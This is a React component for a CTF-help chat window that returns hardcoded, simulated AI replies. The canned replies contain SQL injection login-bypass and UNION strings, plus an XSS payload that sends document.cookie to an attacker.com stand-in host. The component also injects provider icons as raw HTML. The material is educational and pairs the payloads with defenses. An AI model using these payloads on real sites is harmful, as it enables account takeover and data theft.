import { useState, useRef, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card, CardContent, CardFooter, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Loader2, SendIcon, InfoIcon } from "lucide-react";
import { useAuth } from "@/hooks/use-auth";
import { useToast } from "@/hooks/use-toast";

interface ChatMessage {
  role: 'system' | 'user' | 'assistant';
  content: string;
}

interface ChatProvider {
  id: string;
  name: string;
  icon: string;
  available: boolean;
}

interface ChatWindowProps {
  provider: ChatProvider;
  apiKeysAvailable?: boolean;
}

export default function ChatWindow({ provider, apiKeysAvailable = false }: ChatWindowProps) {
  const { user } = useAuth();
  const { toast } = useToast();
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState('');
  const [isSaveDialogOpen, setIsSaveDialogOpen] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  // Initial system message
  useEffect(() => {
    if (provider.available) {
      setMessages([
        {
          role: 'system',
          content: `Hi there! I'm your ${provider.name} for CTF challenges. How can I help you today?`
        }
      ]);
    } else {
      setMessages([]);
    }
  }, [provider]);

  // Auto-scroll to bottom of messages
  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [messages]);

  // Chat completion mutation
  const chatCompletionMutation = useMutation({
    mutationFn: async (userMessage: string) => {
      // This would normally call the AI API directly, but for this demo,
      // we'll simulate a response via our own API that would handle the AI provider API call
      const res = await apiRequest("POST", "/api/chatbot/history", {
        provider: provider.id,
        messages: [...messages, { role: 'user', content: userMessage }],
        title: userMessage.substring(0, 30)
      });
      
      // Return a simulated response
      // In a real app, this would be the actual AI response
      return {
        role: 'assistant' as const,
        content: simulateAIResponse(userMessage, provider.id)
      };
    },
    onSuccess: (response) => {
      setMessages(prev => [...prev, response]);
      setInput('');
    },
    onError: (error) => {
      toast({
        title: "Error getting response",
        description: error.message,
        variant: "destructive"
      });
    }
  });

  // Handle sending a message
  const handleSendMessage = () => {
    if (!input.trim()) return;
    if (!provider.available) {
      toast({
        title: "API Key Required",
        description: "Please add an API key for this provider before sending messages.",
        variant: "destructive"
      });
      return;
    }

    const userMessage = input.trim();
    setMessages(prev => [...prev, { role: 'user', content: userMessage }]);
    setInput('');
    chatCompletionMutation.mutate(userMessage);
  };

  // Handle pressing Enter to send (but Shift+Enter for new line)
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSendMessage();
    }
  };

  // Render the code block with syntax highlighting
  const renderMessageContent = (content: string) => {
    // Simple pattern to detect code blocks with ```
    const parts = content.split(/(```[\s\S]*?```)/g);
    
    return parts.map((part, index) => {
      if (part.startsWith('```') && part.endsWith('```')) {
        // Extract language and code
        const match = part.match(/```(\w*)\n([\s\S]*?)```/);
        const language = match?.[1] || '';
        const code = match?.[2] || part.slice(3, -3);
        
        return (
          <pre key={index} className="bg-black p-2 rounded mt-2 text-green-500 text-xs font-mono overflow-x-auto">
            {language && <div className="text-xs text-muted-foreground mb-1">{language}</div>}
            <code>{code}</code>
          </pre>
        );
      }
      
      // Regular text
      return <p key={index} className="mt-2 first:mt-0">{part}</p>;
    });
  };

  // Simulate AI responses for the demo
  const simulateAIResponse = (userMessage: string, providerId: string) => {
    const lowerMessage = userMessage.toLowerCase();
    
    // Basic SQL Injection response
    if (lowerMessage.includes('sql') || lowerMessage.includes('injection')) {
      return `
SQL injection occurs when user input is directly incorporated into SQL queries without proper sanitization.

For login forms, a common technique is to use the following in the username field:
\`\`\`sql
admin' --
\`\`\`

This might trick the application into executing:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
\`\`\`

The \`--\` comments out the rest of the query, so the password check is ignored.

For more advanced exploits, you can use UNION attacks:
\`\`\`sql
admin' UNION SELECT username, password FROM users --
\`\`\`

This could potentially return all usernames and passwords in the database.

For ethical hacking, always practice on systems you have permission to test!
      `;
    }
    
    // XSS response
    if (lowerMessage.includes('xss') || lowerMessage.includes('cross-site')) {
      return `
Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users.

There are several types:
1. **Reflected XSS**: The malicious script comes from the current HTTP request
2. **Stored XSS**: The malicious script is stored on the target server
3. **DOM-based XSS**: The vulnerability exists in client-side code

Basic XSS payload example:
\`\`\`javascript
<script>alert('XSS');</script>
\`\`\`

More advanced payload to steal cookies:
\`\`\`javascript
<script>
  fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
\`\`\`

To protect against XSS:
- Sanitize user input
- Implement Content Security Policy (CSP)
- Use HttpOnly cookies
- Encode output to HTML entities

For CTF challenges, look for input fields that reflect your input without proper sanitization.
      `;
    }
    
    // General hacking help
    return `
I'd be happy to help with your CTF challenge! Here are some general tips:

1. **Reconnaissance**: Gather as much information as possible about the target
   - Check page source code for comments or hidden fields
   - Look at HTTP headers and cookies
   - Run tools like nmap, dirb, or gobuster to discover endpoints

2. **Common vulnerabilities to check**:
   - SQL Injection
   - Cross-Site Scripting (XSS)
   - Local/Remote File Inclusion
   - Command Injection
   - Insecure Deserialization
   - Authentication bypasses

3. **For cryptography challenges**:
   - Identify the encryption method (look for patterns)
   - Try common tools like CyberChef
   - Check for weak keys or initialization vectors

4. **For web challenges**:
   - Use browser dev tools extensively
   - Check all HTTP requests in the Network tab
   - Try manipulating parameters and cookies

5. **For binary exploitation**:
   - Use tools like Ghidra or IDA Pro to analyze the code
   - Look for buffer overflows, format string vulnerabilities
   - Try common techniques like ret2libc or ROP chains

Can you provide more specific details about the challenge you're working on?
    `;
  };
  
  // Empty state when no provider is selected or available
  if (!provider.id || (!provider.available && apiKeysAvailable)) {
    return (
      <Card className="flex flex-col h-[600px]">
        <CardContent className="flex items-center justify-center flex-col h-full text-center p-8">
          <div className="w-16 h-16 rounded-full bg-muted flex items-center justify-center mb-4">
            <InfoIcon className="h-8 w-8 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-medium mb-2">Select a Bot Assistant</h3>
          <p className="text-muted-foreground max-w-md">
            Choose an AI assistant from the sidebar to help you with your CTF challenges.
          </p>
        </CardContent>
      </Card>
    );
  }
  
  // API Key Missing state
  if (!provider.available && !apiKeysAvailable) {
    return (
      <Card className="flex flex-col h-[600px]">
        <CardContent className="flex items-center justify-center flex-col h-full text-center p-8">
          <div className="w-16 h-16 rounded-full bg-muted flex items-center justify-center mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-muted-foreground"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
          </div>
          <h3 className="text-xl font-medium mb-2">API Key Required</h3>
          <p className="text-muted-foreground max-w-md mb-6">
            To use this AI assistant, you'll need to add your API key in the sidebar settings.
          </p>
          <Button variant="default">
            Manage API Keys
          </Button>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="flex flex-col h-[600px]">
      {/* Chat Header */}
      <CardHeader className="border-b border-border p-4 flex-shrink-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center mr-3">
              <span dangerouslySetInnerHTML={{ __html: provider.icon }} className="text-primary" />
            </div>
            <div>
              <h3 className="font-medium text-white">{provider.name}</h3>
              <p className="text-muted-foreground text-xs">AI assistant for CTF</p>
            </div>
          </div>
          
          <Button variant="ghost" size="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-muted-foreground hover:text-primary"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path><line x1="10" x2="10" y1="11" y2="17"></line><line x1="14" x2="14" y1="11" y2="17"></line></svg>
          </Button>
        </div>
      </CardHeader>
      
      {/* Chat Messages */}
      <CardContent className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-hide">
        {messages.map((message, index) => (
          <div 
            key={index} 
            className={`flex ${message.role === 'user' ? 'justify-end' : 'justify-start'}`}
          >
            <div 
              className={`rounded-lg p-3 max-w-[90%] ${
                message.role === 'user' 
                  ? 'bg-primary/10 border border-primary' 
                  : 'bg-background border border-border'
              }`}
            >
              <div className="text-foreground text-sm">
                {renderMessageContent(message.content)}
              </div>
            </div>
          </div>
        ))}
        
        {chatCompletionMutation.isPending && (
          <div className="flex justify-start">
            <div className="bg-background border border-border rounded-lg p-3">
              <div className="flex items-center space-x-2">
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
                <p className="text-sm text-muted-foreground">Generating response...</p>
              </div>
            </div>
          </div>
        )}
        
        <div ref={messagesEndRef} />
      </CardContent>
      
      {/* Chat Input */}
      <CardFooter className="border-t border-border p-4">
        <div className="flex items-center w-full">
          <Textarea
            rows={1}
            placeholder="Ask me anything about CTF challenges..."
            className="flex-1 bg-background border border-border rounded-md p-3 text-foreground focus-visible:ring-primary resize-none min-h-[60px]"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={handleKeyDown}
            disabled={chatCompletionMutation.isPending}
          />
          <Button
            className="ml-2 p-3"
            disabled={!input.trim() || chatCompletionMutation.isPending}
            onClick={handleSendMessage}
          >
            <SendIcon className="h-5 w-5" />
          </Button>
        </div>
        <div className="flex justify-between mt-2 text-xs text-muted-foreground">
          <span>{provider.name}</span>
          <span>Use /commands for special actions</span>
        </div>
      </CardFooter>
    </Card>
  );
}
